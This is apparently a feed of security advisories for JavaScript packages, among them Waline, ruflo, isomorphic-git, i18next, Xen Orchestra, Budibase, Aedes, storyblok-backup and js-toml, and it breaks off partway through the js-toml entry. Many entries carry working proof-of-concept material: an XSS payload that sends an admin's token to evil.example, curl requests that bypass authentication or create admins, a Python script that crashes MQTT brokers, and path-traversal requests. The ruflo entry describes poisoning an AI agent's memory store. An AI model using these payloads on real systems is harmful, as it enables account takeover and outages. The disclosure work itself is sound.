entry.title: [@waline/client] @waline/client vulnerable to stored XSS through unsanitized comment edit previews
entry.content:
Summary

@waline/client renders the comment editor's live preview with marked and no sanitizer (utils/markdown.ts), and the preview is injected with v-html.

When a comment is edited, the editor is seeded with the comment's raw, un-sanitized body (orig).

Only administrators and the comment owner can edit. So an administrator who clicks Edit on an attacker's comment renders that attacker's raw HTML in their own session: an unauthenticated commenter achieves privilege-escalation stored XSS against a moderator with a single Edit click.

Details

packages/client/src/utils/markdown.ts:18-37 renders markdown with marked and returns the raw HTML with no sanitization (the client bundles no DOMPurify):

return marked.parse(parseEmoji(content, emojiMap)) as string;

packages/client/src/components/CommentBox.vue:

onMounted(() => {
  if (props.edit?.objectId) editor.value = props.edit.orig; // :509  raw comment body
  watchImmediate(() => editor.value, (value) => {
    previewText.value = parseMarkdown(value, { ... });        // :519  runs immediately on mount
  });
});

<div v-show="showPreview" class="wl-preview">     <!-- :616  v-show keeps the node in the DOM -->
  <div class="wl-content" v-html="previewText" /> <!-- :621 -->
</div>

watchImmediate runs the callback synchronously at mount, so previewText is populated with the unsanitized render as soon as the box mounts in edit mode.

v-show (not v-if) means the v-html node is present in the DOM (display:none), so an <img onerror> fires without the moderator ever opening the preview tab.

The tainted value is the attacker's raw comment. packages/server/src/controller/comment.js:41 sets comment.orig = comment.comment for any logged-in user before :55 runs DOMPurify, so orig is the pre-sanitization body. formatCmt returns it to logged-in users, and CommentCard.vue:104 shows the Edit button to admin or owner.

Proof of concept

  1. As an anonymous user, post a comment whose body is the payload below via POST /api/comment:
POST /api/comment
{ "url": "/any-post", "nick": "a", "comment": "<img src=x onerror=fetch('//evil.example/'+JSON.parse(localStorage.WALINE_USER).token)>" }

  1. On the public page the server sanitizes the display copy (markdown-it -> DOMPurify), so nothing fires for ordinary readers and the comment shows as a broken image. The raw body is stored in orig.

  2. As an administrator or the comment owner, click Edit on that comment during normal moderation.

  3. CommentBox mounts, seeds the editor with the raw orig, and watchImmediate immediately renders it through parseMarkdown (marked, no sanitizer) into the v-html preview node. Because the preview uses v-show (display:none), that node is already in the DOM without opening the preview tab, so onerror fires at once in the admin's session and exfiltrates their localStorage JWT.

The server's own comment guard strips this same <img onerror> on the stored display copy, which is why the public listing is safe; the edit preview is the unguarded path.

Impact

The waline JWT is in same-origin localStorage, so the payload can read it, yielding full administrative account takeover.

Suggested fix

Sanitize parseMarkdown's output with DOMPurify before returning it, mirroring the server guard: add dompurify to @waline/client and wrap the return in DOMPurify.sanitize(..., { FORBID_TAGS: ['form','input','style'], FORBID_ATTR: ['autoplay','style'] }).

References

  • https://github.com/walinejs/waline/security/advisories/GHSA-crj3-q72p-ggqm
  • https://nvd.nist.gov/vuln/detail/CVE-2026-64670
  • https://github.com/advisories/GHSA-crj3-q72p-ggqm

entry.title: [ruflo] ruflo MCP bridge allows unauthenticated remote code execution in default Docker Compose deployments
entry.content:
The MCP bridge shipping in ruflo/docker-compose.yml exposed POST /mcp with no authentication. The docker-compose defaults bound the bridge and MongoDB to all interfaces. Combined, an unauthenticated network attacker could invoke tools/call → terminal_execute inside the bridge container, obtain a shell as node (uid 1000), read every provider API key from the container env, spawn attacker-controlled swarms on the victim's keys, and persist a poisoned pattern into the AgentDB learning store that steers future AI outputs for all users of the instance.

The tool blocklist that mentions terminal_execute was enforced only in the autopilot flow. POST /mcp and POST /mcp/:group bypassed it.

Fixed in ADR-166 Phase 1-3 (branch security/adr-166-mcp-bridge-rce, PR #2521):

  • Bind loopback by default; fail-closed on public-bind opt-in without MCP_AUTH_TOKEN
  • Bearer auth middleware (timingSafeEqual constant-time compare)
  • Server-side executeTool gate for terminal_execute (MCP_ENABLE_TERMINAL=true opt-in)
  • MongoDB --auth on by default; MONGO_INITDB_ROOT_PASSWORD required to boot
  • read_only container + tmpfs
  • CORS allowlist wiring
  • CI regression locks (static + runtime + compose defaults)

Operators of any exposed instance MUST:

  1. Firewall :3001 and :27017 immediately
  2. Rotate OPENAI / GOOGLE / OPENROUTER / ANTHROPIC keys
  3. Audit the AgentDB pattern store for injected agentdb_pattern-store entries; purge poisoned patterns. A patched redeploy alone does NOT undo poisoning.
  4. Audit MongoDB for tampering

Credit: Eli Ainhorn, Senior AI Vulnerability Researcher @ Noma Security

Reviewed by Dragan Spiridonov (ADR-166 co-author).

References

entry.title: [isomorphic-git] isomorphic-git allows unbounded memory allocation from attacker-controlled delta target size (DoS)
entry.content:
Summary

When applying a delta object from a packfile, isomorphic-git reads a server-controlled targetSize and calls Buffer.alloc(targetSize) with no upper bound. A single malicious HTTP response to git.clone()/git.fetch() can force a ~2 GB allocation → memory exhaustion / DoS (process killed on memory-constrained hosts).

Details

src/utils/applyDelta.js:

const sourceSize = readVarIntLE(reader)
const targetSize = readVarIntLE(reader)   // attacker-controlled
…
target = Buffer.alloc(targetSize)

A pack with one OBJ_REF_DELTA whose header declares targetSize = 0x7FFFFFFF (~2 GB) and a 1-byte op causes the full allocation up front. The subsequent size-mismatch error is swallowed in GitPackIndex.fromPack, so on a host with spare RAM it silently wastes ~2 GB; on a small host the OS SIGKILLs the process.

Canonical git behavior (divergence)

git rejects the same 78-byte pack in ~96 ms — error: delta replay has gone wild / fatal: … failed to apply delta — with no large allocation and no hang (it bounds delta replay against the declared size rather than trusting it).

PoC

https://github.com/spiceoverflow/av4-oom — open in a Codespace; a single clone/fetch against the bundled server, run under --max-old-space-size=256:

[AV-4] *** OOM ALLOCATION CONFIRMED — Buffer.alloc(targetSize) RAN ***
[AV-4] External (Buffer) memory rose by 2048 MB during clone.

(The allocation is off-heap, so a Node heap cap does not mitigate it.)

Impact

A denial of service via unbounded memory allocation: a single response from a malicious or MitM'd server to git.clone()/git.fetch() forces a multi-gigabyte allocation, crashing the process on memory-constrained hosts.

Any application or service that clones or fetches from untrusted/compromised remotes with isomorphic-git — most acutely containers, serverless functions, and small VMs, where the OS OOM-kills the process.

Suggested fix

Don't pre-allocate the untrusted targetSize: build the result from the actual delta ops and validate the total against targetSize before concatenating (and/or cap it against the advertised pack size).

References

  • https://github.com/isomorphic-git/isomorphic-git/security/advisories/GHSA-9x82-4j54-863h
  • https://nvd.nist.gov/vuln/detail/CVE-2026-63476
  • https://github.com/isomorphic-git/isomorphic-git/pull/2370

entry.title: [i18next] i18next deepExtend recurses into inherited built-ins, allowing corruption of shared built-in objects (DoS)
entry.content:
Summary

deepExtend in src/utils.js (reached via the public addResourceBundle(lng, ns, data, deep, overwrite) API) checked key existence with the in operator, which walks the prototype chain. A source key matching an inherited built-in (e.g. hasOwnProperty, toString, valueOf) therefore caused the function to recurse into the shared object on Object.prototype. With overwrite: true, a nested value could overwrite a property of that shared built-in — for example setting Object.prototype.hasOwnProperty.call to a non-callable value — corrupting it process-wide and causing an unrecoverable denial of service.

This is distinct from CVE-2026-48713 (i18next-fs-backend) and CVE-2026-48714 (i18next-http-middleware), which are prototype pollution via setPath/key-walking in different packages. This issue is in i18next core, via a different mechanism (the in operator in deepExtend), and is gated behind a non-default call configuration.

Details

src/utils.js (≤ 26.3.3):

export const deepExtend = (target, source, overwrite) => {
  for (const prop in source) {
    if (prop !== '__proto__' && prop !== 'constructor') {
      if (prop in target) {            // <-- walks the prototype chain
        if (isString(target[prop]) || target[prop] instanceof String ||
            isString(source[prop]) || source[prop] instanceof String) {
          if (overwrite) target[prop] = source[prop];
        } else {
          deepExtend(target[prop], source[prop], overwrite);
        }
      } else {
        target[prop] = source[prop];
      }
    }
  }
  return target;
};

For source = { hasOwnProperty: { call: "corrupted" } } and target = {}: "hasOwnProperty" in target is true (inherited from Object.prototype), so the code recurses with target = Object.prototype.hasOwnProperty. In that call, "call" in target is true (inherited from Function.prototype), source.call is a string, and with overwrite: true the assignment sets an own call property on Object.prototype.hasOwnProperty to the string "corrupted". Every subsequent Object.prototype.hasOwnProperty.call(...) then throws TypeError, including i18next's own internals.

The existing __proto__/constructor guard does not cover this, because the corruption target is an inherited built-in function, not the prototype object itself.

Proof of Concept

import i18next from 'i18next';

await i18next.init({ lng: 'en', resources: { en: { translation: {} } } });

const payload = { hasOwnProperty: { call: 'corrupted' } };
i18next.addResourceBundle('en', 'translation', payload, /* deep */ true, /* overwrite */ true);

// Process-wide corruption:
Object.prototype.hasOwnProperty.call({}, 'test'); // TypeError: ... is not a function

Impact

Denial of service (process-wide, unrecoverable) and limited integrity impact (a shared built-in property is set to an attacker-supplied value).

Preconditions (why severity is Medium, not High): the application must pass attacker-controlled data into addResourceBundle with both deep: true and overwrite: true. No standard i18next backend or integration does this; it only occurs in explicit application code that merges untrusted content. The default addResourceBundle path (no deep merge, or overwrite falsy) is not affected.

Patch

Fixed in i18next 26.3.4 by checking existence with Object.prototype.hasOwnProperty.call(target, prop) instead of the in operator, so inherited keys are copied as plain own data instead of triggering recursion.

References

  • https://github.com/i18next/i18next/security/advisories/GHSA-6jcc-5g8w-32mx
  • https://nvd.nist.gov/vuln/detail/CVE-2026-63402
  • https://github.com/i18next/i18next/commit/642137b7786d83661ec3ee53027798dc4b81d30a
  • https://github.com/i18next/i18next/releases/tag/v26.3.4
  • https://github.com/advisories/GHSA-6jcc-5g8w-32mx

entry.title: [xo-server] Xen Orchestra: Empty-object login token
entry.content:
Summary

REST cookie parsing turns authenticationToken=j:%7B%7D into {}. REST authentication passes that object to the XO token provider without requiring a string. The token collection treats {} as an unfiltered lookup and returns its first token; the provider authenticates as that token's owner if it is unexpired. The authenticated /rest/v0/users/me/authentication_tokens route then returns reusable login token IDs.

Details

  1. In packages/xo-server/src/api/session.mjs, function signIn(credentials) has no params schema (unlike the deprecated signInWithToken, which declares token: { type: 'string' }), so credentials.token can be any JSON value.
  2. packages/xo-server/src/xo-mixins/authentication.mjs, token provider:
    this.registerAuthenticationProvider(async ({ token: tokenId }, { ip } = {}) => {
  if (!tokenId) return          // {} is truthy → passes
  const token = await app.getAuthenticationToken(tokenId)
  ...
  return { bypassOtp: true, expiration: token.expiration, userId: token.user_id }
  3. getAuthenticationToken(properties) explicitly accepts an object, and _getAuthenticationToken(id, properties) does this._tokens.first(properties ?? id).
  4. Collection#first(properties) -> _get(properties); in collection/redis.mjs, if (isEmpty(properties)) return redis.sMembers(prefix + '_ids')… → all tokens. Non-empty objects on indexed fields (user_id, client_id) do an index lookup → token of the chosen user.
  5. HTTP paths: index.mjs (req.cookies.token → isValidAuthenticationToken), xo-mixins/rest-api.mjs and @xen-orchestra/rest-api middleware (cookies.authenticationToken ?? cookies.token → authenticateUser({ token })). cookie-parser turns j:-prefixed cookie values into parsed JSON, so authenticationToken=j:{} yields {}.

Proof of concept

The object cookie returned 200 with unexpired token IDs, and one ID worked on a fresh request as an admin account. The attacker does not choose which token the empty-object lookup returns. Authentication succeeds only if the token returned first is unexpired and belongs to an existing user; if it is expired or its user was deleted, the request fails without trying another token.

curl -b 'authenticationToken=j:{}' https://<ip>/rest/v0/users

Impact

An adversary can bypass authentication and perform actions with 'Admin' privilege. Xen Orchestra compromise can lead to arbitrary code execution on managed pools and a full XCP-ng node takeover as root.

References

  • https://github.com/vatesfr/xen-orchestra/security/advisories/GHSA-2r3w-c2vx-fv5g
  • https://github.com/vatesfr/xen-orchestra/pull/10748
  • https://github.com/vatesfr/xen-orchestra/commit/50166fe3a49c02069d35ba9046ca4a1f77f4e11d
  • https://docs.vates.tech/security-advisories/advisories/2026/vates-sa-2026-062
  • https://github.com/advisories/GHSA-2r3w-c2vx-fv5g

entry.title: [@budibase/server] Budibase: Unauthenticated global-admin & database creation via tenant-confusion bypass of the one-time init guard (`POST /api/global/users/init`)
entry.content:
Description

Summary

On a self-hosted, single-tenant Budibase instance (multiTenancy:false), the public bootstrap endpoint POST /api/global/users/init remains fully exploitable after the instance has been provisioned. Its "already initialised" guard (checkAnyUserExists()) is evaluated inside a tenant-scoped database context derived from an attacker-controlled tenantId in the request body. Because the tenancy layer never constrains that tenantId to the only legitimate tenant (default) on a single-tenant deployment, an unauthenticated attacker simply supplies any unused tenant name to make the guard see an empty user list, and the endpoint then creates a brand-new CouchDB database (<tenantId>_global-db) and a global-admin user document (admin.global = true, builder.global = true) inside it - with no authentication and no CSRF token.

This is (a) a bypass of the security control meant to permanently close first-run setup, and (b) an unauthenticated, persistent write primitive that lets an anonymous attacker create an unbounded number of databases and admin-user documents - a resource-exhaustion / denial-of-service vector against the CouchDB datastore, plus creation of latent rogue admin accounts.

Details

Root cause chain (source, tag v3.44.0):

  1. packages/worker/src/api/index.ts:41 - POST /api/global/users/init is in PUBLIC_ENDPOINTS, so auth.buildAuthMiddleware(PUBLIC_ENDPOINTS) marks it publicEndpoint and the "no public access to worker" gate (api/index.ts:159-165) lets it through without any session. It is also in NO_TENANCY_ENDPOINTS (api/index.ts:83), so the tenancy middleware does not pin the request to default - the tenant is taken verbatim from the request body - and in NO_CSRF_ENDPOINTS.
  2. packages/worker/src/middleware/cloudRestricted.ts:10,25 - the cloudRestricted guard only enforces the internal API key when !env.SELF_HOSTED && !env.DISABLE_ACCOUNT_PORTAL. On a self-hosted instance (SELF_HOSTED=true) it is a no-op (return next()), so cloudRestrictedRoutes provides no protection here.
  3. packages/worker/src/api/routes/global/users.ts:69-79 - cloudRestrictedRoutes.post("/api/global/users/init", … controller.adminUser).
  4. packages/worker/src/api/controllers/global/users.ts:232 - the handler runs await tenancy.doInTenant(tenantId, …) using the attacker-supplied tenantId.
  5. packages/worker/src/api/controllers/global/users.ts:238 - the only guard, const userExists = await checkAnyUserExists(), throws 403 only if a user exists in the current tenant context.
  6. packages/worker/src/utilities/users.ts:3-15 - checkAnyUserExists() calls tenancy.getGlobalDB(), which resolves to <tenantId>_global-db. For any unused tenantId this DB is empty → the guard passes → userSdk.db.createAdminUser(email, tenantId, …) (users.ts:247) creates a full global admin.

The defect is incorrect authorization scoping: the single-tenant deployment invariant ("only tenant default exists; init is one-time") is never enforced against the request-supplied tenantId, so the guard is evaluated against a namespace the attacker chooses.

Configuration confirmed via GET /api/system/environment → {"multiTenancy":false,"cloud":false,"disableAccountPortal":false,"isDev":false}.

PoC

Target http://127.0.0.1:3014 (Budibase v3.44.0-cloud.2). No credentials, no cookies, no CSRF token. All values real, captured live on 2026-09-02; nothing redacted.

Step 1 - BASELINE: the guard correctly blocks re-init of the real tenant (default)

curl -s -i -X POST 'http://127.0.0.1:3014/api/global/users/init' \
  -H 'Content-Type: application/json' \
  -d '{"email":"pwn-default@evil.test","password":"Pwned!2026#bb","tenantId":"default"}'

Burp - Request

POST /api/global/users/init HTTP/1.1
Host: 127.0.0.1:3014
Content-Type: application/json
Content-Length: 82

{"email":"pwn-default@evil.test","password":"Pwned!2026#bb","tenantId":"default"}

Burp - Response

HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8

{"message":"You cannot initialise once an global user has been created.","status":403}

Step 2 - PAYLOAD: supply any unused tenantId → the guard is bypassed and a global admin is created, fully unauthenticated

curl -s -i -X POST 'http://127.0.0.1:3014/api/global/users/init' \
  -H 'Content-Type: application/json' \
  -d '{"email":"pwn-f7poc@evil.test","password":"Pwned!2026#bb","tenantId":"f7poc"}'

Burp - Request

POST /api/global/users/init HTTP/1.1
Host: 127.0.0.1:3014
Content-Type: application/json
Content-Length: 78

{"email":"pwn-f7poc@evil.test","password":"Pwned!2026#bb","tenantId":"f7poc"}

Burp - Response

HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"_id":"us_d0c2b6c9014a43e2899a2770d2e6280c","_rev":"1-554ff75f0064fb15f92e341faad7263b","email":"pwn-f7poc@evil.test"}

The single differential - tenantId:"default" → 403, tenantId:"f7poc" → 200 with a persisted us_… id - is the whole bug: the one-time-setup guard is scoped to a namespace the attacker chooses.

Step 3 - the write persisted: re-init of the same tenant now hits the (per-tenant) guard

curl -s -i -X POST 'http://127.0.0.1:3014/api/global/users/init' \
  -H 'Content-Type: application/json' \
  -d '{"email":"pwn-f7pocb@evil.test","password":"Pwned!2026#bb","tenantId":"f7poc"}'

Burp - Response

HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8

{"message":"You cannot initialise once an global user has been created.","status":403}

Each unique tenantId is a fresh write primitive - an attacker loops tenantId=a0001,a0002,… to create unbounded databases + admin docs (DoS).

Step 4 & 5 - datastore side-effect: a new <tenant>_global-db and a real global-admin document

Read directly from CouchDB inside the container ($COUCH_DB_URL = http://admin:…@127.0.0.1:5984):

GET /_all_dbs =>
[
 "app_cc322a9cd27a492eb934f43b146c6e81",
 "app_dev_cc322a9cd27a492eb934f43b146c6e81",
 "f7poc_global-db",     <-- created by the unauthenticated init call (tenantId=f7poc)
 "global-db"            <-- legitimate default-tenant global DB
]

rogue DB 'f7poc_global-db' present: True

The document created in f7poc_global-db is a full global admin:

{
  "_id": "us_d0c2b6c9014a43e2899a2770d2e6280c",
  "email": "pwn-f7poc@evil.test",
  "admin":   { "global": true },
  "builder": { "global": true },
  "tenantId": "default",
  "roles": {}
}

Step 6 - ceiling check (honest): the injected admin cannot log in while multi-tenancy is off

curl -s -i -X POST 'http://127.0.0.1:3014/api/global/auth/f7poc/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"pwn-f7poc@evil.test","password":"Pwned!2026#bb"}'

Burp - Response

HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8

{"message":"Invalid credentials","status":403}

With multiTenancy:false the login flow forces the default tenant, so the injected admin is not usable to log into the running default-tenant instance. The provable impact is therefore control-bypass + unauthenticated persistent datastore writes / DoS + creation of rogue admin accounts that become active if multi-tenancy is later enabled or during tenant-iterating operations (restore/migration).

Impact

Type: Missing/incorrect authorization on a critical function - unauthenticated bypass of the one-time initialization guard, yielding anonymous global-admin-document and database creation.

Who is impacted: every self-hosted single-tenant Budibase instance exposing the worker API (via the front nginx). Any unauthenticated network attacker can:

  • defeat the first-run setup lock that is supposed to be permanently closed after provisioning;
  • create global-admin user documents in attacker-named tenants with no credentials (latent rogue admins that activate if multi-tenancy is enabled or during migration/restore);
  • create an unbounded number of CouchDB databases (<rand>_global-db) and documents - a resource-exhaustion / DoS vector against the datastore (disk, inodes, file descriptors, the _dbs metadata shard).

References

  • https://github.com/Budibase/budibase/security/advisories/GHSA-25qc-m4pw-2w8r
  • https://nvd.nist.gov/vuln/detail/CVE-2026-122247
  • https://github.com/Budibase/budibase/commit/362a7fe9aea594531ece1cf15be76cc00bfb88b9
  • https://github.com/Budibase/budibase/releases/tag/v3.50.0
  • https://github.com/Budibase/budibase/releases/tag/v4.0.0
  • https://github.com/advisories/GHSA-25qc-m4pw-2w8r

entry.title: [@budibase/server] Budibase: Cross-privilege Stored XSS in the Budibase Builder via broken HTML-escaping in `jsonFormatter.format()` rendered through `{@html}` in the CSP-less Builder origin
entry.content:
Description

Summary

A low-privileged application end-user (role BASIC - not a builder or admin, and on a public data-collection form, an unauthenticated visitor) can store an HTML/JavaScript payload in ordinary row data. When a builder or admin later opens that table in the Budibase Builder and evaluates any Handlebars binding whose Preview surfaces the value (the Data-section Formula column editor, or any binding drawer), the stored value is rendered as raw HTML and the attacker's JavaScript executes in the Builder's origin.

The Builder SPA is served by nginx with no Content-Security-Policy (the CSP middleware only decorates the server-rendered published-app document, not /builder/). The injected script therefore runs unrestricted in the highest-trust surface of the product - the admin/builder session that can create datasources, run server-side JavaScript via automations, read and modify every table, and manage users. This is a cross-privilege stored XSS (app end-user → builder/admin), i.e. full workspace takeover, not self-XSS.

Details

Root cause 1 - the escaper is a no-op. packages/frontend-core/src/utils/jsonFormatter.ts (format()):

jsonString = jsonString
  .replace(/&/g, "&")   // no-op: replaces "&" with "&"  (should be "&")
  .replace(/</g, "<")   // no-op                          (should be "<")
  .replace(/>/g, ">")   // no-op                          (should be ">")

return jsonString.replace(
  /("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+...)/g,
  (match) => {
    if (/^"/.test(match)) {
      if (/:$/.test(match)) { color = colors.keyColor }                        // KEY: NOT escaped
      else { match = '"' + escapeHtml(match.substr(1, match.length - 2)) + '"' } // string VALUE: escaped
    }
    return `<span style="...">${match}</span>`
  })

Only quoted JSON string values are passed through escapeHtml. Everything else is emitted verbatim, because the leading .replace(/&/g,"&")… chain replaces each character with itself. Two consequences:

  1. A raw, non-JSON string (the normal result of a Handlebars binding that resolves to a plain text field value) matches none of the regex tokens and is returned completely un-escaped.
  2. Object keys are never escaped.

Root cause 2 - the output is injected with {@html}. packages/builder/src/components/common/bindings/EvaluationSidePanel.svelte:

  • line 116: {@html logLine.log}
  • line 128: {@html highlightedResult}

highlightedResult is the output of JsonFormatter.format(), so the un-escaped attacker string is inserted into the DOM as live markup.

Root cause 3 - binding output is not entity-escaped upstream. Every {{ … }} statement is wrapped by the ALL helper in packages/string-templates/src/helpers/index.ts, which returns a Handlebars.SafeString; Handlebars therefore performs no HTML escaping, and the raw field value reaches the formatter/{@html} sink.

Root cause 4 - no CSP on the Builder. GET /builder/* is served as a static SPA by nginx with no Content-Security-Policy header (verified live below). The contentSecurityPolicy middleware (packages/backend-core/src/middleware/contentSecurityPolicy.ts) only sets a nonce-based CSP on the server-rendered published-app document (serveApp). So in the Builder origin there is no script-src restriction and inline event handlers run freely.

Cross-privilege data channel. Internal-table dev/prod data live in separate databases, but external datasources are queried live and shared between the published app (where low-priv users write) and the Builder's dev preview (where the value is rendered). A BASIC app user writing to an external SQL table that a data-collection app exposes for writes therefore lands the payload directly in the Builder's evaluation context. RowUtils.generateGoldenSample() even prefers the longest string per column, guaranteeing a long payload is the sample the Preview evaluates.

Payload shape note. jsonFormatter.format() tokenises quoted strings, digits and true/false/null into <span>s, which would fragment a handler containing them. A payload free of double-quotes, digits and those literals - e.g. <img src=x onerror=alert(window.xssproof=document.domain)> - survives verbatim and executes.

entry.title: [aedes] Aedes has Uncaught Exception and Uncontrolled Resource Consumption
entry.content:
Summary

A remote Denial of Service (DoS) vulnerability, allows any remote client to cause a complete crash of the Aedes MQTT broker process. This is achieved by sending a specially crafted MQTT message (via PUBLISH or SUBSCRIBE), or by setting a Will message with such a topic, containing a highly recursive topic string (e.g., with thousands of '/' delimiters). The lack of input validation and error handling leads to an uncaught exception in an internal routing library, terminating the entire Node.js application.

Details

The Aedes broker fails to enforce limits on the depth or structural complexity of MQTT topic strings. When a client publishes to or subscribes to a topic with excessive levels of recursion, the internal routing logic cascading into the qlobber library (via mqemitter) reaches an hard-coded limit within the qlobber._split_words function.

This function throws a hard Error: too many words (found in lib/qlobber.js:604). Crucially, Aedes does not wrap the calls to these internal modules (such as in handlers/subscribe.js or the publishing logic) in try-catch blocks. Consequently, this exception propagates up to the main Node.js event loop as an unhandled exception, causing the entire broker process to crash immediately.

This vulnerability affects all stable versions of Aedes due to the underlying dependency behavior and missing perimetral validation.

Stack Trace from Crash:

aedes-broker  | /app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:604
aedes-broker  | 	throw new Error('too many words');
aedes-broker  | 	^
aedes-broker  | 
aedes-broker  | Error: too many words
aedes-broker  |     at Qlobber._split_words (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:604:15)
aedes-broker  |     at Qlobber._split (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:624:18)
aedes-broker  |     at Qlobber.add (/app/node_modules/mqemitter/node_modules/qlobber/lib/qlobber.js:651:43)
aedes-broker  |     at MQEmitter.on (/app/node_modules/mqemitter/mqemitter.js:65:17)
aedes-broker  |     at Aedes.subscribe (/app/node_modules/aedes/aedes.js:289:11)
aedes-broker  |     at SubState.addSubs (/app/node_modules/aedes/lib/handlers/subscribe.js:167:12)

The same uncaught exception can be triggered without an explicit PUBLISH/SUBSCRIBE: a client that registers a Will message with a deeply nested topic crashes the broker when the Will is published on ungraceful disconnect, because the Will publish path calls broker.publish directly and bypasses the PUBLISH handler.

PoC

Prerequisites

  • Aedes MQTT Broker running and accessible over the network. For testing and replication, the broker was deployed using the official Docker image via the following command:
docker run -d --name aedes-broker -p 1883:1883 moscajs/aedes:latest
  • Ability to establish an MQTT session (authenticated or unauthenticated, as per the broker's configuration).

Reproduction Steps

  1. Save the following Python stress testing script (mqtt_crash_poc.py):
#!/usr/bin/env python3
import argparse
import time
import paho.mqtt.client as mqtt

def on_connect(client, userdata, flags, reason_code, properties=None):
    if reason_code != 0:
        print(f"[-] Error en la conexión: {reason_code}")

def on_disconnect(client, userdata, disconnect_flags, reason_code, properties=None):
    if reason_code != 0:
        print(f"[*] -> Desconexión detectada (Caída del bróker). Razón: {reason_code}")

def run_exploit(host, port):
    # Escenarios de colapso directo (Casos 1.2, 1.3, 2.2, 2.3)
    payloads = [
            {"type": "PUB_DEEP", "topic": "a/" * 30000 + "target"},
            {"type": "PUB_LIMIT", "topic": "a/" * 32766 + "a/b"},
            {"type": "SUB_WILD", "topic": "+/" * 150 + "#", "pub": "A/" * 150 + "target"},
            {"type": "SUB_DEEP", "topic": "+/" * 10000 + "#", "pub": "A/" * 10000 + "target"}
    ]
        
    for case in payloads:
        print(f"\n[*] Lanzando vector de ataque tipo: {case['type']}")
        client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
        client.on_connect = on_connect
        client.on_disconnect = on_disconnect
            
        try:
            client.connect(host, port, keepalive=60)
            client.loop_start()
            time.sleep(1)
                
            if "PUB" in case['type']:
                client.publish(case['topic'], payload="DoS_Attack", qos=0)
            else:
                client.subscribe(case['topic'], qos=0)
                time.sleep(1)
                client.publish(case['pub'], payload="DoS_Attack", qos=0)
                    
            time.sleep(2)
        except Exception as e:
            print(f"[-] Error durante el envío: {e}")
        finally:
            client.loop_stop()
            client.disconnect()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--direccion", required=True, help="IP del broker")
    parser.add_argument("-p", "--puerto", type=int, default=1883, help="Puerto")
    args = parser.parse_args()
    run_exploit(args.direccion, args.puerto)
  1. Run the script against the target broker:python3 mqtt_crash_poc.py -d -p 1883
  2. Upon execution, the Aedes broker dies instantly on the very first packet (PUB_DEEP). Checking the container logs will reveal the stack trace provided in the Details section, confirming the Error: too many words exception.

Impact

This is a Remote Denial of Service (DoS) vulnerability. It affects any infrastructure running an unpatched Aedes MQTT Broker. A successful attack terminates the service entirely, disconnecting all legitimate clients (IoT devices, applications, users) and preventing reconnection until the process is manually or automatically restarted, causing severe business and operational interruption.

References

  • https://github.com/moscajs/aedes/security/advisories/GHSA-xxqp-5qx8-gj5q
  • https://nvd.nist.gov/vuln/detail/CVE-2026-63341
  • https://github.com/moscajs/aedes/commit/b9024faa4cb416c4c6980760b4d7f55336315f2d
  • https://github.com/moscajs/aedes/releases/tag/v1.1.1
  • https://github.com/advisories/GHSA-xxqp-5qx8-gj5q

entry.title: [storyblok-backup] storyblok-backup: Stored path traversal via unsanitized Storyblok component names in backup output
entry.content:
Summary

storyblok-backup writes files using unsanitized names for Storyblok components, which are content type or schema definitions. This allows a component name containing path traversal sequences to cause backup files to be written outside the intended backup directory. Anyone with component management access in the source Storyblok space, not server access, can plant a malicious component name that causes arbitrary file writes on the machine of anyone who later runs a backup against that space.

Details

The writeJson function, which takes a folder, a file name, and content, builds the output file path by directly concatenating the backup directory, the folder, and the file name as strings, with no path sanitization or containment check.

For the components resource type specifically, the file name used is the component's own name field, which is free text and editable by anyone with component management access in the Storyblok CMS.

Other resource types are not affected by this same issue. Stories and datasources use their numeric IDs as filenames, and assets have their filename derived by splitting on the slash character and taking the last segment, which strips path separators. This issue is scoped specifically to components.

Since the component name is stored in Storyblok and only read back later when the backup tool runs, this is a stored, second order vulnerability. The malicious value is planted once, then triggers on every subsequent backup run performed by anyone using this tool against that Storyblok space.

PoC

Step 1 — plant the malicious component name via Storyblok's Management API:

curl -X POST "https://mapi.storyblok.com/v1/spaces//components/"
-H "Authorization: "
-H "Content-Type: application/json"
-d '{ "component": { "name": "../../../../tmp/evil-storyblok-backup", "schema": {} } }'

Any Storyblok user with component-management permission in the space (not server access to wherever backups run) can do this through the Storyblok UI just as easily, by naming a new component with this value in the component name field.

Step 2 — run storyblok-backup against this space, exactly as a normal user would:

npx storyblok-backup
--space
--token
--path ./backup
--types "components"

Step 3 — observe the actual file write location:

With the malicious component name above, the tool's writeJson() function builds the output path as:

backupDir + "/components" + "/../../../../tmp/evil-storyblok-backup" + ".json"

which resolves outside ./backup entirely. Confirm with:

ls -la /tmp/evil-storyblok-backup.json

The file exists there, outside the --path ./backup directory that was configured, containing the full JSON definition of the malicious component.

Step 4 — for comparison, confirm assets and stories are NOT affected:

The same defaultFetch() pattern is used for stories and datasources (fileField: numeric id) and for assets (fileField derived via .split('/').at(-1), which strips any path separators from the value before it reaches writeJson()). Only the components resource type passes a raw, unsanitized user-editable string directly into the file path.

Impact

Anyone with the ability to create or rename a component in the source Storyblok space, which is a content management privilege and not server access, can cause the backup tool, when run by someone else, to write files outside the intended backup directory on whatever machine runs the backup. Depending on the path chosen and the permissions of the process running the backup, this could overwrite existing files at attacker chosen locations on the host filesystem.

Suggested fix: sanitize the component name before using it as a filename, for example by applying the same last-path-segment treatment already used for assets, or by resolving the final path and verifying it stays within the intended backup directory before writing.

entry.title: [js-toml] js-toml allows uncontrolled recursion in `load()` leading `RangeError` (stack exhaustion) on deeply nested input
entry.content:
Summary

load() parses untrusted TOML using a recursive-descent parser (Chevrotain) and a recursive tree-walking interpreter. Neither the parser nor the interpreter enforces a maximum nesting / key depth. A small, attacker-controlled document with deep nesting (arrays, inline tables) or a long dotted key drives recursion past the V8 call-stack limit, and load() throws an uncaught RangeError: Maximum call stack size exceeded.

This is a problem for two reasons:

  1. Denial of Service. A tiny payload (≈2 KB) reliably aborts parsing. In any service that parses user-supplied TOML, an unhandled RangeError can crash the worker/process (500 / restart loop).

